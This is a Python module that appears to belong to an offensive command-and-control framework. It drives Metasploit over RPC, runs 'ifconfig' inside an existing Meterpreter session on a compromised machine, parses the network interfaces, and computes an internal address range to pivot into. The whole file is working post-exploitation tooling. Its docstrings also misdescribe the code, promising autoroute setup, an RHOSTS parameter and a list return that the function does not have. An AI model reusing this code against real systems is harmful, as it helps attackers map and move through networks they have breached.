"""
Run ifconfig to network interfaces info.
"""
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient
from time import sleep

def run(client, SESSION):
    """
    Setup autoroute for pivoting via existing Meterpreter session
    \n:param client: MsfRpcClient object
    \n:param SESSION: numeric session id
    \n:param RHOSTS: range eg. 10.10.10.1-254 
    \n:return type: list of IPs or empty list if none found
    """

    shell = client.sessions.session(SESSION)
    shell.write('ifconfig\n')
    r = ''
    while 'Interface' not in r:
        sleep(3)
        r = shell.read() # don't access shell in Armitage/msfconsole
        print(r)
    interfaces = dict()
    for l1 in r.split('\n\n'):
        intf = ''
        for l2 in l1.split('\n'):
            if(l2.startswith('Interface')):
                intf = l2.strip()
                interfaces[intf] = dict()
            if(' : ' in l2):
                kv = l2.split(' : ')
                interfaces[intf][kv[0].strip()] = kv[1]
    return interfaces

# for unit testing of each technique
if __name__ == '__main__':
    client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
    # autoadd is easiest, but one can be more specific:
    from stage2.external_c2 import msf_wait_for_session
    id = msf_wait_for_session.run(client)
    interfaces = run(client, id)
    pivot_address = ''
    for k, v in interfaces.items():
        if(v['IPv4 Netmask'] in '255.255.255.0'):
            pivot_address = v['IPv4 Address']
            break
    pivot_range = pivot_address.split('.')
    pivot_range[len(pivot_range)-1] = '1-254'
    pivot_range = ".".join(map(str,pivot_range))
    print(pivot_range)